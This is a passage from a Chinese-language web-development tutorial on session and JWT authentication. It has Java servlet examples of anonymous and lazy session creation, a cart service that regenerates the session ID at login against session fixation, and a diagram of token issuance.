</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>Set-Cookie: JSESSIONID=abc123; Path=/; HttpOnly; Secure; SameSite=Strict
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>方式2：URL重写（不推荐，安全性差）
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>http://example.com/page;jsessionid=abc123
</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>
</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>方式3：HTTP Header（适用于API）
</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>X-Session-ID: abc123
</span></code></pre></div></p>
</li>
<li>
<p><strong>Session查找</strong>
   <div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>每次请求：
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>1. 从Cookie/Header中提取SessionID
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>2. 使用SessionID从存储中查找Session对象
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>3. 验证Session是否过期
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>4. 更新最后访问时间（如果需要滑动过期）
</span></code></pre></div></p>
</li>
</ol>
<h3 id="13-常见疑问未登录时是否生成sessiontoken">1.3 常见疑问：未登录时是否生成Session/Token？<a class="headerlink" href="#13-常见疑问未登录时是否生成sessiontoken" title="链接到此标题">&para;</a></h3>
<p>这是一个非常重要的概念区分点，直接影响到系统的设计和实现。</p>
<h4 id="session的情况">Session的情况<a class="headerlink" href="#session的情况" title="链接到此标题">&para;</a></h4>
<p><strong>答案：取决于框架配置，通常有两种情况</strong></p>
<p><strong>情况1：自动创建匿名Session（默认行为）</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1">// 用户第一次访问网站（未登录）</span>
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">homepage</span>
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>
</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="c1">// Servlet容器自动创建匿名Session</span>
</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="n">HttpSession</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">();</span><span class="w">  </span><span class="c1">// 默认true，会自动创建</span>
</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="c1">// 生成SessionID: abc123</span>
</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="c1">// 但Session内容是空的，没有用户信息</span>
</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>
</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="c1">// 响应</span>
</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a><span class="n">Set</span><span class="o">-</span><span class="n">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">abc123</span><span class="p">;</span><span class="w"> </span><span class="n">Path</span><span class="o">=/</span><span class="p">;</span><span class="w"> </span><span class="n">HttpOnly</span>
</span></code></pre></div>
<p><strong>特点：</strong>
- ✅ 用于跟踪匿名用户（浏览历史、购物车等）
- ✅ Session存在，但没有用户身份信息
- ✅ 可以存储临时数据（如：未登录时的购物车）
- ⚠️  占用服务器资源（即使用户未登录）</p>
<p><strong>情况2：懒创建Session（按需创建）</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="c1">// 第一次访问（未登录）</span>
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="n">HttpSession</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span><span class="w">  </span><span class="c1">// false表示不自动创建</span>
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="c1">// session == null</span>
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="c1">// 只在登录成功后创建Session</span>
</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onLoginSuccess</span><span class="p">(</span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="w">    </span><span class="n">HttpSession</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  </span><span class="c1">// true表示创建</span>
</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a><span class="w">    </span><span class="n">session</span><span class="p">.</span><span class="na">setAttribute</span><span class="p">(</span><span class="s">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="p">);</span>
</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong>实际应用示例：电商网站</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="cm">/**</span>
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="cm"> * 区分匿名Session和登录Session</span>
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="cm"> */</span>
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="nd">@Service</span>
</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SessionService</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>
</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a><span class="cm">     * 检查用户是否已登录</span>
</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="cm">     */</span>
</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">isAuthenticated</span><span class="p">(</span><span class="n">HttpSession</span><span class="w"> </span><span class="n">session</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">session</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
</span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-31-14"><a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a>
</span><span id="__span-31-15"><a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a><span class="w">        </span><span class="c1">// 检查Session中是否有用户信息</span>
</span><span id="__span-31-16"><a id="__codelineno-31-16" name="__codelineno-31-16" href="#__codelineno-31-16"></a><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">User</span><span class="p">)</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&quot;user&quot;</span><span class="p">);</span>
</span><span id="__span-31-17"><a id="__codelineno-31-17" name="__codelineno-31-17" href="#__codelineno-31-17"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
</span><span id="__span-31-18"><a id="__codelineno-31-18" name="__codelineno-31-18" href="#__codelineno-31-18"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-31-19"><a id="__codelineno-31-19" name="__codelineno-31-19" href="#__codelineno-31-19"></a>
</span><span id="__span-31-20"><a id="__codelineno-31-20" name="__codelineno-31-20" href="#__codelineno-31-20"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-31-21"><a id="__codelineno-31-21" name="__codelineno-31-21" href="#__codelineno-31-21"></a><span class="cm">     * 匿名Session使用场景：未登录的购物车</span>
</span><span id="__span-31-22"><a id="__codelineno-31-22" name="__codelineno-31-22" href="#__codelineno-31-22"></a><span class="cm">     */</span>
</span><span id="__span-31-23"><a id="__codelineno-31-23" name="__codelineno-31-23" href="#__codelineno-31-23"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">addToCart</span><span class="p">(</span><span class="n">HttpSession</span><span class="w"> </span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">Product</span><span class="w"> </span><span class="n">product</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-31-24"><a id="__codelineno-31-24" name="__codelineno-31-24" href="#__codelineno-31-24"></a><span class="w">        </span><span class="c1">// 即使未登录，也可以使用Session存储购物车</span>
</span><span id="__span-31-25"><a id="__codelineno-31-25" name="__codelineno-31-25" href="#__codelineno-31-25"></a><span class="w">        </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Product</span><span class="o">&gt;</span><span class="w"> </span><span class="n">cart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">List</span><span class="p">)</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&quot;cart&quot;</span><span class="p">);</span>
</span><span id="__span-31-26"><a id="__codelineno-31-26" name="__codelineno-31-26" href="#__codelineno-31-26"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cart</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-31-27"><a id="__codelineno-31-27" name="__codelineno-31-27" href="#__codelineno-31-27"></a><span class="w">            </span><span class="n">cart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">();</span>
</span><span id="__span-31-28"><a id="__codelineno-31-28" name="__codelineno-31-28" href="#__codelineno-31-28"></a><span class="w">            </span><span class="n">session</span><span class="p">.</span><span class="na">setAttribute</span><span class="p">(</span><span class="s">&quot;cart&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">cart</span><span class="p">);</span>
</span><span id="__span-31-29"><a id="__codelineno-31-29" name="__codelineno-31-29" href="#__codelineno-31-29"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-31-30"><a id="__codelineno-31-30" name="__codelineno-31-30" href="#__codelineno-31-30"></a><span class="w">        </span><span class="n">cart</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">product</span><span class="p">);</span>
</span><span id="__span-31-31"><a id="__codelineno-31-31" name="__codelineno-31-31" href="#__codelineno-31-31"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-31-32"><a id="__codelineno-31-32" name="__codelineno-31-32" href="#__codelineno-31-32"></a>
</span><span id="__span-31-33"><a id="__codelineno-31-33" name="__codelineno-31-33" href="#__codelineno-31-33"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-31-34"><a id="__codelineno-31-34" name="__codelineno-31-34" href="#__codelineno-31-34"></a><span class="cm">     * 登录后转换为认证Session</span>
</span><span id="__span-31-35"><a id="__codelineno-31-35" name="__codelineno-31-35" href="#__codelineno-31-35"></a><span class="cm">     */</span>
</span><span id="__span-31-36"><a id="__codelineno-31-36" name="__codelineno-31-36" href="#__codelineno-31-36"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-31-37"><a id="__codelineno-31-37" name="__codelineno-31-37" href="#__codelineno-31-37"></a><span class="w">        </span><span class="c1">// 1. 获取或创建Session</span>
</span><span id="__span-31-38"><a id="__codelineno-31-38" name="__codelineno-31-38" href="#__codelineno-31-38"></a><span class="w">        </span><span class="n">HttpSession</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
</span><span id="__span-31-39"><a id="__codelineno-31-39" name="__codelineno-31-39" href="#__codelineno-31-39"></a>
</span><span id="__span-31-40"><a id="__codelineno-31-40" name="__codelineno-31-40" href="#__codelineno-31-40"></a><span class="w">        </span><span class="c1">// 2. 保存旧的匿名数据（购物车）</span>
</span><span id="__span-31-41"><a id="__codelineno-31-41" name="__codelineno-31-41" href="#__codelineno-31-41"></a><span class="w">        </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Product</span><span class="o">&gt;</span><span class="w"> </span><span class="n">anonymousCart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">List</span><span class="p">)</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&quot;cart&quot;</span><span class="p">);</span>
</span><span id="__span-31-42"><a id="__codelineno-31-42" name="__codelineno-31-42" href="#__codelineno-31-42"></a>
</span><span id="__span-31-43"><a id="__codelineno-31-43" name="__codelineno-31-43" href="#__codelineno-31-43"></a><span class="w">        </span><span class="c1">// 3. 重新生成SessionID（防止Session固定攻击）</span>
</span><span id="__span-31-44"><a id="__codelineno-31-44" name="__codelineno-31-44" href="#__codelineno-31-44"></a><span class="w">        </span><span class="n">request</span><span class="p">.</span><span class="na">changeSessionId</span><span class="p">();</span>
</span><span id="__span-31-45"><a id="__codelineno-31-45" name="__codelineno-31-45" href="#__codelineno-31-45"></a>
</span><span id="__span-31-46"><a id="__codelineno-31-46" name="__codelineno-31-46" href="#__codelineno-31-46"></a><span class="w">        </span><span class="c1">// 4. 设置用户信息（Session从匿名变为认证）</span>
</span><span id="__span-31-47"><a id="__codelineno-31-47" name="__codelineno-31-47" href="#__codelineno-31-47"></a><span class="w">        </span><span class="n">session</span><span class="p">.</span><span class="na">setAttribute</span><span class="p">(</span><span class="s">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="p">);</span>
</span><span id="__span-31-48"><a id="__codelineno-31-48" name="__codelineno-31-48" href="#__codelineno-31-48"></a>
</span><span id="__span-31-49"><a id="__codelineno-31-49" name="__codelineno-31-49" href="#__codelineno-31-49"></a><span class="w">        </span><span class="c1">// 5. 恢复购物车数据</span>
</span><span id="__span-31-50"><a id="__codelineno-31-50" name="__codelineno-31-50" href="#__codelineno-31-50"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">anonymousCart</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-31-51"><a id="__codelineno-31-51" name="__codelineno-31-51" href="#__codelineno-31-51"></a><span class="w">            </span><span class="n">session</span><span class="p">.</span><span class="na">setAttribute</span><span class="p">(</span><span class="s">&quot;cart&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">anonymousCart</span><span class="p">);</span>
</span><span id="__span-31-52"><a id="__codelineno-31-52" name="__codelineno-31-52" href="#__codelineno-31-52"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-31-53"><a id="__codelineno-31-53" name="__codelineno-31-53" href="#__codelineno-31-53"></a>
</span><span id="__span-31-54"><a id="__codelineno-31-54" name="__codelineno-31-54" href="#__codelineno-31-54"></a><span class="w">        </span><span class="n">log</span><span class="p">.</span><span class="na">info</span><span class="p">(</span><span class="s">&quot;User {} logged in, session converted from anonymous to authenticated&quot;</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-31-55"><a id="__codelineno-31-55" name="__codelineno-31-55" href="#__codelineno-31-55"></a><span class="w">                 </span><span class="n">user</span><span class="p">.</span><span class="na">getUsername</span><span class="p">());</span>
</span><span id="__span-31-56"><a id="__codelineno-31-56" name="__codelineno-31-56" href="#__codelineno-31-56"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-31-57"><a id="__codelineno-31-57" name="__codelineno-31-57" href="#__codelineno-31-57"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong>实际场景流程：</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>电商网站Session生命周期：
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>1. 用户打开网站（未登录）
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>   ┌─────────────────────────────────┐
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>   │ 创建匿名Session                  │
</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>   │ SessionID: abc123               │
</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a>   │ Data: { cart: [] }              │  ← 可以存储购物车
</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a>   └─────────────────────────────────┘
</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a>
</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a>2. 用户浏览并添加商品到购物车
</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a>   ┌─────────────────────────────────┐
</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a>   │ SessionID: abc123               │
</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a>   │ Data: {                         │
</span><span id="__span-32-14"><a id="__codelineno-32-14" name="__codelineno-32-14" href="#__codelineno-32-14"></a>   │   cart: [商品A, 商品B]          │  ← 未登录也能购物
</span><span id="__span-32-15"><a id="__codelineno-32-15" name="__codelineno-32-15" href="#__codelineno-32-15"></a>   │ }                               │
</span><span id="__span-32-16"><a id="__codelineno-32-16" name="__codelineno-32-16" href="#__codelineno-32-16"></a>   └─────────────────────────────────┘
</span><span id="__span-32-17"><a id="__codelineno-32-17" name="__codelineno-32-17" href="#__codelineno-32-17"></a>
</span><span id="__span-32-18"><a id="__codelineno-32-18" name="__codelineno-32-18" href="#__codelineno-32-18"></a>3. 用户点击&quot;结算&quot;，跳转到登录页
</span><span id="__span-32-19"><a id="__codelineno-32-19" name="__codelineno-32-19" href="#__codelineno-32-19"></a>
</span><span id="__span-32-20"><a id="__codelineno-32-20" name="__codelineno-32-20" href="#__codelineno-32-20"></a>4. 用户登录成功
</span><span id="__span-32-21"><a id="__codelineno-32-21" name="__codelineno-32-21" href="#__codelineno-32-21"></a>   ┌─────────────────────────────────┐
</span><span id="__span-32-22"><a id="__codelineno-32-22" name="__codelineno-32-22" href="#__codelineno-32-22"></a>   │ SessionID: xyz789 (重新生成)     │  ← 防止Session固定攻击
</span><span id="__span-32-23"><a id="__codelineno-32-23" name="__codelineno-32-23" href="#__codelineno-32-23"></a>   │ Data: {                         │
</span><span id="__span-32-24"><a id="__codelineno-32-24" name="__codelineno-32-24" href="#__codelineno-32-24"></a>   │   user: { id: 1001, ... },     │  ← 添加用户信息
</span><span id="__span-32-25"><a id="__codelineno-32-25" name="__codelineno-32-25" href="#__codelineno-32-25"></a>   │   cart: [商品A, 商品B]          │  ← 保留购物车数据
</span><span id="__span-32-26"><a id="__codelineno-32-26" name="__codelineno-32-26" href="#__codelineno-32-26"></a>   │ }                               │
</span><span id="__span-32-27"><a id="__codelineno-32-27" name="__codelineno-32-27" href="#__codelineno-32-27"></a>   └─────────────────────────────────┘
</span><span id="__span-32-28"><a id="__codelineno-32-28" name="__codelineno-32-28" href="#__codelineno-32-28"></a>
</span><span id="__span-32-29"><a id="__codelineno-32-29" name="__codelineno-32-29" href="#__codelineno-32-29"></a>5. 用户完成结算
</span><span id="__span-32-30"><a id="__codelineno-32-30" name="__codelineno-32-30" href="#__codelineno-32-30"></a>   - Session继续使用
</span><span id="__span-32-31"><a id="__codelineno-32-31" name="__codelineno-32-31" href="#__codelineno-32-31"></a>   - 购物车数据可以清空或保留
</span></code></pre></div>
<h4 id="jwt-token的情况">JWT Token的情况<a class="headerlink" href="#jwt-token的情况" title="链接到此标题">&para;</a></h4>
<p><strong>答案：不会！未登录时不生成JWT Token</strong></p>
<p>JWT Token只在**登录成功后**才生成，原因：</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>JWT Token特点：
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>1. 自包含：Token中包含用户身份信息（sub, username, roles）
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>2. 有签名：签名证明用户身份已被服务器验证
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>3. 有过期时间：表示认证的有效期
</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>4. 代表认证状态：Token的存在本身就表示&quot;已认证&quot;
</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>
</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>未登录的用户没有经过身份验证，无法生成有效的JWT！
</span></code></pre></div>
<p><strong>流程对比：</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>未登录用户访问受保护API：
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>┌──────────┐                 ┌──────────┐
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>│   客户端  │                 │   服务器  │
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>└────┬─────┘                 └────┬─────┘
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>     │                            │
</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>     │  GET /api/user/profile     │
</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>     │  (无Token)                 │
</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>     ├──────────────────────────&gt; │
</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>     │                            │
</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>     │                            │  检查Authorization Header
</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a>     │                            │  → 没有Token
</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a>     │                            │  → 无法识别用户身份
</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a>     │                            │
</span><span id="__span-34-14"><a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a>     │  401 Unauthorized          │
</span><span id="__span-34-15"><a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a>     │  { &quot;error&quot;: &quot;Authentication required&quot; }
</span><span id="__span-34-16"><a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a>     │&lt;────────────────────────── │
</span><span id="__span-34-17"><a id="__codelineno-34-17" name="__codelineno-34-17" href="#__codelineno-34-17"></a>     │                            │
</span><span id="__span-34-18"><a id="__codelineno-34-18" name="__codelineno-34-18" href="#__codelineno-34-18"></a>
</span><span id="__span-34-19"><a id="__codelineno-34-19" name="__codelineno-34-19" href="#__codelineno-34-19"></a>登录后获取Token：
</span><span id="__span-34-20"><a id="__codelineno-34-20" name="__codelineno-34-20" href="#__codelineno-34-20"></a>     │                            │
</span><span id="__span-34-21"><a id="__codelineno-34-21" name="__codelineno-34-21" href="#__codelineno-34-21"></a>     │  POST /api/auth/login      │
</span><span id="__span-34-22"><a id="__codelineno-34-22" name="__codelineno-34-22" href="#__codelineno-34-22"></a>     │  {                         │
</span><span id="__span-34-23"><a id="__codelineno-34-23" name="__codelineno-34-23" href="#__codelineno-34-23"></a>     │    &quot;username&quot;: &quot;zhang&quot;,    │
</span><span id="__span-34-24"><a id="__codelineno-34-24" name="__codelineno-34-24" href="#__codelineno-34-24"></a>     │    &quot;password&quot;: &quot;***&quot;       │
</span><span id="__span-34-25"><a id="__codelineno-34-25" name="__codelineno-34-25" href="#__codelineno-34-25"></a>     │  }                         │
</span><span id="__span-34-26"><a id="__codelineno-34-26" name="__codelineno-34-26" href="#__codelineno-34-26"></a>     ├──────────────────────────&gt; │
</span><span id="__span-34-27"><a id="__codelineno-34-27" name="__codelineno-34-27" href="#__codelineno-34-27"></a>     │                            │
</span><span id="__span-34-28"><a id="__codelineno-34-28" name="__codelineno-34-28" href="#__codelineno-34-28"></a>     │                            │  1. 验证凭证成功
</span><span id="__span-34-29"><a id="__codelineno-34-29" name="__codelineno-34-29" href="#__codelineno-34-29"></a>     │                            │  2. 生成JWT Token
</span><span id="__span-34-30"><a id="__codelineno-34-30" name="__codelineno-34-30" href="#__codelineno-34-30"></a>     │                            │     {
</span><span id="__span-34-31"><a id="__codelineno-34-31" name="__codelineno-34-31" href="#__codelineno-34-31"></a>     │                            │       &quot;sub&quot;: &quot;1001&quot;,
</span><span id="__span-34-32"><a id="__codelineno-34-32" name="__codelineno-34-32" href="#__codelineno-34-32"></a>     │                            │       &quot;username&quot;: &quot;zhang&quot;,
</span><span id="__span-34-33"><a id="__codelineno-34-33" name="__codelineno-34-33" href="#__codelineno-34-33"></a>     │                            │       &quot;roles&quot;: [&quot;user&quot;],
</span><span id="__span-34-34"><a id="__codelineno-34-34" name="__codelineno-34-34" href="#__codelineno-34-34"></a>     │                            │       &quot;exp&quot;: 1735689600
